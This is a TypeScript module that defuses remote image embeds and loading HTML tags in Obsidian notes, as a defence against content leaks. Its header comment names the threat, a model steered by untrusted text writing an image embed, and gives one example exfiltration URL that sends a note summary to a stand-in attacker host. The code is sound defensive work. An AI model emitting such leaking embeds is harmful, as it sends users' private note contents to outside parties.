/**
 * Remote embed neutralizer (docs/adr/0022-remote-embeds.md). A note body written by a model that
 * read untrusted text can hold an image that Obsidian loads from the network as soon as the note
 * is viewed, for example `![](https://attacker.example/x.png?d=<summary>)`, which leaks content.
 * This module turns every such embed into something that is still visible but needs a click:
 *
 * - Markdown image `![alt](url ...)` whose destination could leave the vault: the `!` is dropped,
 *   so it becomes the link `[alt](url ...)`. A `!` right before it is escaped (`\!`), so dropping
 *   one never makes another image.
 * - Reference images `![alt][ref]`, `![alt][]` and `![alt]` whose label has a remote definition
 *   (`[ref]: https://...`) in the text or in `context` (the stored body of a note being appended
 *   to): the `!` is dropped the same way. A remote definition in the text whose label an image in
 *   `context` uses gets a backslash (`\[ref]: ...`), so it stays visible as text and defines
 *   nothing.
 * - HTML start tag with a loading attribute (`src`, `srcset`, `poster`, `data`, `background`,
 *   `lowsrc`, `dynsrc`, `srcdoc`, a `style` that can load) holding a remote value, and every
 *   `<style`, `<link`, `<base`, `<meta` and `<svg` tag: the `<` becomes `&lt;`, so the tag shows
 *   as text and loads nothing.
 *
 * "Remote" is anything that is not a plain path inside the vault: a scheme (`https:`, `data:`,
 * any other), a protocol-relative `//host`, or an `&` or `\` before the scheme is settled (an
 * entity or an escape could spell one). Local embeds (`![](attachments/x.png)`), Obsidian embeds
 * (`![[note]]`), wikilinks and plain links are left as they are. Code blocks and code spans get
 * the same treatment as prose: telling them apart reliably needs a full Markdown parser, and a
 * wrong guess would keep a live embed.
 *
 * Every scan is linear in the input: each text position is examined a bounded number of times,
 * and the HTML tag scanner shares results between tags (memo) under a global step budget; past
 * the budget every remaining tag is escaped.
 */

/** The rule id the neutralization is reported under, next to the secret scrub rule ids. */
export const REMOTE_EMBED_RULE = "remote_embed";

export interface NeutralizeResult {
  text: string;
  /** How many embeds, definitions and tags were neutralized. */
  count: number;
}

// ---------------------------------------------------------------------------------------------
// URL test

const UrlPhase = { Lead: 0, Slash: 1, Scheme: 2 } as const;
type UrlPhase = (typeof UrlPhase)[keyof typeof UrlPhase];

/**
 * Feeds the characters of a URL one by one and settles as soon as it can whether the URL could
 * leave the vault. Mirrors the URL parser: leading C0 controls and spaces are dropped, tab, CR
 * and LF are dropped anywhere. `feed` returns true (remote), false (local) or undefined (needs
 * more); `end` gives the verdict for a URL that ended before it settled (local).
 */
class UrlCheck {
  private phase: UrlPhase = UrlPhase.Lead;
  verdict: boolean | undefined;

  feed(code: number): boolean | undefined {
    if (this.verdict !== undefined) return this.verdict;
    if (code === 0x09 || code === 0x0a || code === 0x0d) return undefined;
    if (code === 0x26 || code === 0x5c) {
      this.verdict = true; // & or \: an entity or an escape could spell a scheme or a slash
      return true;
    }
    switch (this.phase) {
      case UrlPhase.Lead:
        if (code <= 0x20) return undefined;
        if (code === 0x2f) {
          this.phase = UrlPhase.Slash;
          return undefined;
        }
        if (isAsciiLetter(code)) {
          this.phase = UrlPhase.Scheme;
          return undefined;
        }
        this.verdict = false;
        return false;
      case UrlPhase.Slash:
        this.verdict = code === 0x2f;
        return this.verdict;
      case UrlPhase.Scheme:
        if (code === 0x3a) {
          this.verdict = true;
          return true;
        }
        if (isSchemeChar(code)) return undefined;
        this.verdict = false;
        return false;
    }
  }
}

function isAsciiLetter(code: number): boolean {
  return (code >= 0x41 && code <= 0x5a) || (code >= 0x61 && code <= 0x7a);
}

function isSchemeChar(code: number): boolean {
  return (
    isAsciiLetter(code) ||
    (code >= 0x30 && code <= 0x39) ||
    code === 0x2b ||
    code === 0x2d ||
    code === 0x2e
  );
}

/** Whether the URL that starts at `from` in `text` could leave the vault. Reads only its start. */
export function remoteUrlAt(text: string, from: number): boolean {
  const check = new UrlCheck();
  for (let i = from; i < text.length; i++) {
    const verdict = check.feed(text.charCodeAt(i));
    if (verdict !== undefined) return verdict;
  }
  return false;
}

// ---------------------------------------------------------------------------------------------
// Markdown

const LABEL_MAX = 999;
/** Stands for a label that spans lines: container markers may hide its real text. */
const ANY_LABEL = "\u0000any";

function escapedAt(text: string, index: number): boolean {
  let run = 0;
  for (let i = index - 1; i >= 0 && text.charCodeAt(i) === 0x5c; i--) run++;
  return run % 2 === 1;
}

/** Case fold and whitespace collapse of a link label, as CommonMark matches them. */
function normalizeLabel(raw: string): string {
  if (raw.includes("\n") || raw.includes("\r")) return ANY_LABEL;
  return raw
    .trim()
    .replace(/[ \t]+/g, " ")
    .toUpperCase()
    .toLowerCase();
}

/**
 * The end (index of `]`) of a bracketed label that starts after `[` at `from`, or -1 when an
 * unescaped `[` comes first, the text ends, or the label is longer than CommonMark allows.
 */
function labelEnd(text: string, from: number): number {
  const limit = Math.min(text.length, from + LABEL_MAX + 1);
  for (let i = from; i < limit; i++) {
    const code = text.charCodeAt(i);
    if (code === 0x5c) {
      i++;
    } else if (code === 0x5b) {
      return -1;
    } else if (code === 0x5d) {
      return i;
    }
  }
  return -1;
}

interface Definition {
  /** Index of the opening `[`. */
  at: number;
  label: string;
  remote: boolean;
}

/**
 * Every `[label]:` in the text, wherever it stands (a superset of the real definitions, which may
 * sit in quotes and list items). A destination on the next line counts as remote: a container
 * marker could stand before it.
 */
function findDefinitions(text: string): Definition[] {
  const found: Definition[] = [];
  for (let at = text.indexOf("["); at !== -1; at = text.indexOf("[", at + 1)) {
    if (escapedAt(text, at)) continue; // `\[` starts no definition
    const end = labelEnd(text, at + 1);
    if (end === -1 || text.charCodeAt(end + 1) !== 0x3a) continue;
    let i = end + 2;
    while (text.charCodeAt(i) === 0x20 || text.charCodeAt(i) === 0x09) i++;
    const code = text.charCodeAt(i);
    let remote: boolean;
    if (code === 0x0a || code === 0x0d) remote = true;
    else if (code === 0x3c) remote = remoteUrlAt(text, i + 1);
    else remote = remoteUrlAt(text, i);
    found.push({ at, label: normalizeLabel(text.slice(at + 1, end)), remote });
  }
  return found;
}

type ImageVerdict = { kind: "none" } | { kind: "remote" } | { kind: "labels"; labels: string[] };

/**
 * Judges the `![` at `at` (not escaped). `remote`: the image could load from outside the vault
 * whatever the definitions say (remote inline destination, or a shape this scanner does not
 * follow). `labels`: it loads from outside only if one of these labels has a remote definition.
 * `none`: not an image (no closing bracket, or an Obsidian embed `![[target]]`).
 */
function judgeImage(text: string, at: number): ImageVerdict {
  const open = at + 1;
  if (text.charCodeAt(open + 1) === 0x5b) {
    // `![[target]]` is an Obsidian embed when the target holds no bracket and no line break and
    // nothing that could continue it as a Markdown image follows.
    for (let i = open + 2; i < text.length; i++) {
      const code = text.charCodeAt(i);
      if (code === 0x5d) {
        const next = text.charCodeAt(i + 2);
        const wiki =
          i > open + 2 && text.charCodeAt(i + 1) === 0x5d && next !== 0x28 && next !== 0x5b;
        return wiki ? { kind: "none" } : { kind: "remote" };
      }
      if (code === 0x5b || code === 0x0a || code === 0x0d) return { kind: "remote" };
    }
    return { kind: "remote" };
  }
  let close = -1;
  for (let i = open + 1; i < text.length; i++) {
    const code = text.charCodeAt(i);
    if (code === 0x5c) {
      i++;
    } else if (code === 0x5d) {
      close = i;
      break;
    } else if (code === 0x5b || code === 0x60 || code === 0x3c) {
      return { kind: "remote" }; // nested brackets, code spans or HTML in the alt text
    }
  }
  if (close === -1) return { kind: "none" };
  const alt = normalizeLabel(text.slice(open + 1, close));
  const next = text.charCodeAt(close + 1);
  if (next === 0x28) {
    let i = close + 2;
    while (text.charCodeAt(i) === 0x20 || text.charCodeAt(i) === 0x09) i++;
    const code = text.charCodeAt(i);
    if (code === 0x0a || code === 0x0d) return { kind: "remote" };
    if (code === 0x3c ? remoteUrlAt(text, i + 1) : remoteUrlAt(text, i)) return { kind: "remote" };
    return { kind: "labels", labels: [alt] };
  }
  if (next === 0x5b) {
    const end = labelEnd(text, close + 2);
    if (end > close + 2) {
      return { kind: "labels", labels: [alt, normalizeLabel(text.slice(close + 2, end))] };
    }
  }
  return { kind: "labels", labels: [alt] };
}

function* imageStarts(text: string): Generator<number> {
  for (let at = text.indexOf("!["); at !== -1; at = text.indexOf("![", at + 1)) {
    if (!escapedAt(text, at)) yield at;
  }
}

function anyRemote(labels: readonly string[], remoteLabels: ReadonlySet<string>): boolean {
  if (remoteLabels.size === 0) return false;
  if (remoteLabels.has(ANY_LABEL)) return true;
  return labels.some((label) => label === ANY_LABEL || remoteLabels.has(label));
}

function neutralizeMarkdown(text: string, context: string): NeutralizeResult {
  const definitions = findDefinitions(text);
  const remoteLabels = new Set<string>();
  for (const def of [...findDefinitions(context), ...definitions]) {
    if (def.remote) remoteLabels.add(def.label);
  }

  /** Replacements of single characters, by index: "" drops it. */
  const edits = new Map<number, string>();
  for (const at of imageStarts(text)) {
    const verdict = judgeImage(text, at);
    if (verdict.kind === "none") continue;
    if (verdict.kind === "labels" && !anyRemote(verdict.labels, remoteLabels)) continue;
    edits.set(at, "");
    if (at > 0 && text.charCodeAt(at - 1) === 0x21 && !escapedAt(text, at - 1)) {
      edits.set(at - 1, "\\!");
    }
  }

  // An image already stored in `context` cannot change: a remote definition for its label in the
  // new text is defused instead.
  if (context !== "") {
    const usedLabels = new Set<string>();
    for (const at of imageStarts(context)) {
      const verdict = judgeImage(context, at);
      if (verdict.kind === "labels") for (const label of verdict.labels) usedLabels.add(label);
    }
    for (const def of definitions) {
      if (!def.remote || escapedAt(text, def.at)) continue;
      const used =
        usedLabels.has(def.label) ||
        (usedLabels.size > 0 && def.label === ANY_LABEL) ||
        usedLabels.has(ANY_LABEL);
      if (used) edits.set(def.at, "\\[");
    }
  }
  return applyEdits(text, edits);
}

function applyEdits(text: string, edits: ReadonlyMap<number, string>): NeutralizeResult {
  if (edits.size === 0) return { text, count: 0 };
  const positions = [...edits.keys()].sort((a, b) => a - b);
  const parts: string[] = [];
  let copied = 0;
  let count = 0;
  for (const at of positions) {
    const replacement = edits.get(at) as string;
    parts.push(text.slice(copied, at), replacement);
    copied = at + 1;
    // An escaped `!` before a dropped one is part of the same neutralization.
    if (replacement !== "\\!") count++;
  }
  parts.push(text.slice(copied));
  return { text: parts.join(""), count };
}

// ---------------------------------------------------------------------------------------------
// HTML

const St = {
  TagName: 0,
  BeforeAttrName: 1,
  SelfClosing: 2,
  AfterQuoted: 3,
  AttrName: 4,
  AfterAttrName: 5,
  BeforeAttrValue: 6,
  Dq: 7,
  Sq: 8,
  Unquoted: 9,
} as const;
type St = (typeof St)[keyof typeof St];

/** States in which no attribute is half read: what follows is the same for every tag there. */
const MEMO_STATES = 4;
const KNOWN = 1;
const REMOTE = 2;
const TERMINATED = 4;

/** Tags escaped whatever their attributes: they load or redirect through other means. */
const ALWAYS_ESCAPED = new Set(["style", "link", "base", "meta", "svg"]);

type ValueKind = "url" | "srcset" | "style" | "srcdoc";

const LOADING_ATTRIBUTES: ReadonlyMap<string, ValueKind> = new Map<string, ValueKind>([
  ["src", "url"],
  ["poster", "url"],
  ["data", "url"],
  ["background", "url"],
  ["lowsrc", "url"],
  ["dynsrc", "url"],
  ["srcset", "srcset"],
  ["style", "style"],
  ["srcdoc", "srcdoc"],
]);

const NAME_KEEP = 12;
const STYLE_LOADS = /url|image|import|[\\&]/i;

function isHtmlSpace(code: number): boolean {
  return code === 0x20 || code === 0x09 || code === 0x0a || code === 0x0c || code === 0x0d;
}

/** Judges one attribute value as it is read (container markers already skipped). */
class ValueCheck {
  private url: UrlCheck | undefined;
  private remote = false;
  private readonly chars: number[] = [];

  constructor(private readonly kind: ValueKind) {
    if (kind === "url" || kind === "srcset") this.url = new UrlCheck();
  }

  feed(code: number): void {
    if (this.remote) return;
    if (this.kind === "srcdoc") {
      this.remote = true;
      return;
    }
    if (this.kind === "style") {
      if (this.chars.length < 4096) this.chars.push(code);
      else this.remote = true;
      return;
    }
    if (this.kind === "srcset" && (isHtmlSpace(code) || code === 0x2c)) {
      // A new candidate URL starts after each separator; descriptors (`2x`, `100w`) are local.
      this.url = new UrlCheck();
      return;
    }
    if ((this.url as UrlCheck).feed(code) === true) this.remote = true;
  }

  done(): boolean {
    if (this.kind === "style") {
      return this.remote || STYLE_LOADS.test(String.fromCharCode(...this.chars));
    }
    return this.remote;
  }
}

export interface TagVerdict {
  /** Index of the `<`. */
  at: number;
  /** A loading attribute holds a remote value, or the tag is one that is always escaped. */
  escape: boolean;
  /** A loading attribute holds a remote value. */
  remote: boolean;
  /** A `>` ends the tag before the text ends. */
  terminated: boolean;
}

/**
 * Reads every start tag (`<` and an ASCII letter) the way a browser tokenizer would, with each
 * line break followed by blockquote markers (`>` after optional spaces) read as a line break
 * only, since Markdown strips them before an HTML block reaches the browser. A tag reaches the
 * next `>` outside a quoted value, or the end of the text.
 */
export function judgeTags(text: string): TagVerdict[] {
  const length = text.length;
  const memo = new Uint8Array((length + 1) * MEMO_STATES);
  let budget = 64 * length + 100_000;
  const verdicts: TagVerdict[] = [];

  for (let at = text.indexOf("<"); at !== -1; at = text.indexOf("<", at + 1)) {
    if (!isAsciiLetter(text.charCodeAt(at + 1))) continue;
    const name = tagName(text, at + 1);
    const always = ALWAYS_ESCAPED.has(name);
    if (budget <= 0) {
      verdicts.push({ at, escape: true, remote: true, terminated: false });
      continue;
    }
    const visited: number[] = [];
    let remoteMark = 0;
    let tailFlags = 0; // flags of the memo entry the scan ended on, if any
    let terminated = false;
    let state: St = St.TagName;
    let p = at + 1;
    let attrName = "";
    let value: ValueCheck | undefined;

    const finishValue = () => {
      if (value?.done()) remoteMark = visited.length;
      value = undefined;
    };
    const startValue = () => {
      const kind = LOADING_ATTRIBUTES.get(attrName);
      value = kind === undefined ? undefined : new ValueCheck(kind);
    };

    for (;;) {
      if (--budget <= 0) {
        tailFlags = KNOWN | REMOTE;
        break;
      }
      if (state < MEMO_STATES) {
        const key = p * MEMO_STATES + state;
        const known = memo[key] as number;
        if (known & KNOWN) {
          tailFlags = known;
          terminated = (known & TERMINATED) !== 0;
          break;
        }
        visited.push(key);
      }
      if (p >= length) {
        finishValue();
        break;
      }
      const code = text.charCodeAt(p);
      let consumed = true;
      switch (state) {
        case St.TagName:
          if (isHtmlSpace(code)) state = St.BeforeAttrName;
          else if (code === 0x2f) state = St.SelfClosing;
          else if (code === 0x3e) terminated = true;
          break;
        case St.SelfClosing:
          if (code === 0x3e) terminated = true;
          else {
            state = St.BeforeAttrName;
            consumed = false;
          }
          break;
        case St.BeforeAttrName:
          if (isHtmlSpace(code)) break;
          if (code === 0x2f || code === 0x3e) {
            state = St.AfterAttrName;
            attrName = "";
            consumed = false;
          } else {
            state = St.AttrName;
            attrName = "";
            consumed = code === 0x3d;
            if (consumed) attrName = "=";
          }
          break;
        case St.AttrName:
          if (isHtmlSpace(code) || code === 0x2f || code === 0x3e) {
            state = St.AfterAttrName;
            consumed = false;
          } else if (code === 0x3d) {
            state = St.BeforeAttrValue;
          } else if (attrName.length <= NAME_KEEP) {
            attrName += String.fromCharCode(code).toLowerCase();
          }
          break;
        case St.AfterAttrName:
          if (isHtmlSpace(code)) break;
          if (code === 0x2f) state = St.SelfClosing;
          else if (code === 0x3d) state = St.BeforeAttrValue;
          else if (code === 0x3e) terminated = true;
          else {
            // A new attribute: the same as starting one from BeforeAttrName, which is memoized.
            state = St.BeforeAttrName;
            consumed = false;
          }
          break;
        case St.BeforeAttrValue:
          if (isHtmlSpace(code)) break;
          startValue();
          if (code === 0x22) state = St.Dq;
          else if (code === 0x27) state = St.Sq;
          else if (code === 0x3e) {
            value = undefined;
            terminated = true;
          } else {
            state = St.Unquoted;
            consumed = false;
          }
          break;
        case St.Dq:
        case St.Sq:
          if (code === (state === St.Dq ? 0x22 : 0x27)) {
            finishValue();
            state = St.AfterQuoted;
          } else value?.feed(code);
          break;
        case St.Unquoted:
          if (isHtmlSpace(code)) {
            finishValue();
            state = St.BeforeAttrName;
          } else if (code === 0x3e) {
            finishValue();
            terminated = true;
          } else value?.feed(code);
          break;
        case St.AfterQuoted:
          if (isHtmlSpace(code)) state = St.BeforeAttrName;
          else if (code === 0x2f) state = St.SelfClosing;
          else if (code === 0x3e) terminated = true;
          else {
            state = St.BeforeAttrName;
            consumed = false;
          }
          break;
      }
      if (terminated) break;
      if (consumed) {
        p++;
        if (code === 0x0a || code === 0x0d) p = skipMarkers(text, p);
      }
    }

    const tailRemote = (tailFlags & REMOTE) !== 0;
    const endFlags = KNOWN | (terminated ? TERMINATED : 0);
    for (let i = 0; i < visited.length; i++) {
      const remote = i < remoteMark || tailRemote;
      memo[visited[i] as number] = endFlags | (remote ? REMOTE : 0);
    }
    const remote = remoteMark > 0 || tailRemote;
    verdicts.push({ at, escape: remote || always, remote, terminated });
  }
  return verdicts;
}

/** Skips spaces, tabs and blockquote markers at the start of a line. */
function skipMarkers(text: string, from: number): number {
  let p = from;
  for (;;) {
    const code = text.charCodeAt(p);
    if (code === 0x20 || code === 0x09 || code === 0x3e) p++;
    else return p;
  }
}

/** The lowercased tag name at `from`, cut after 16 characters (no tag of interest is longer). */
function tagName(text: string, from: number): string {
  let name = "";
  for (let i = from; i < text.length && name.length <= 16; i++) {
    const code = text.charCodeAt(i);
    if (isHtmlSpace(code) || code === 0x2f || code === 0x3e) break;
    name += String.fromCharCode(code).toLowerCase();
  }
  return name;
}

function neutralizeHtml(text: string): NeutralizeResult {
  const edits = new Map<number, string>();
  for (const verdict of judgeTags(text)) {
    if (verdict.escape) edits.set(verdict.at, "&lt;");
  }
  return applyEdits(text, edits);
}

// ---------------------------------------------------------------------------------------------
// Entry points

/**
 * Neutralizes every remote embed of a note body (see the module comment). `context` is the
 * stored body the text will be appended to: read for reference definitions and images, never
 * changed. Idempotent on its own output with the same context.
 */
export function neutralizeRemoteEmbeds(text: string, context = ""): NeutralizeResult {
  const html = neutralizeHtml(text);
  const markdown = neutralizeMarkdown(html.text, context);
  return { text: markdown.text, count: html.count + markdown.count };
}

/**
 * True when appending `text` to `stored` (joined as `joined`) would give a tag that starts in
 * `stored` a remote loading attribute it does not have alone: a tag left open at the end of the
 * stored body takes its attributes from the appended text, which `neutralizeRemoteEmbeds` cannot
 * see. Stored bytes never change, so the caller refuses the append.
 */
export function appendOpensStoredTag(stored: string, joined: string): boolean {
  const alone = judgeTags(stored);
  if (alone.every((tag) => tag.terminated)) return false;
  const before = new Map(alone.map((tag) => [tag.at, tag.remote]));
  for (const tag of judgeTags(joined)) {
    if (tag.at >= stored.length) break;
    if (tag.remote && before.get(tag.at) !== true) return true;
  }
  return false;
}
